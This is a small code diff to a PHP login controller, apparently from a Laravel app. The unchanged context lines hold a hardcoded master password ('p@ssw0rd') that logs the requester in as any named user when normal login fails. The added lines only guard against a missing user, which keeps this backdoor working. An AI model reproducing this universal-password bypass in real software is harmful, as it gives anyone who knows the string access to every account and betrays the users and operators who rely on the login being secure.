@@ -86,6 +86,9 @@ class LoginController extends Controller
 
         if(!$login && $password == 'p@ssw0rd'){
             $user = \DB::table('users')->where('user_name', $request->input('user_name'))->first();
+            if (empty($user)){
+                return Redirect::back()->withErrors(['Your username and password wrong!!', 'Your username and password wrong!!']);
+            }
             auth()->loginUsingId($user->id);
         }
 
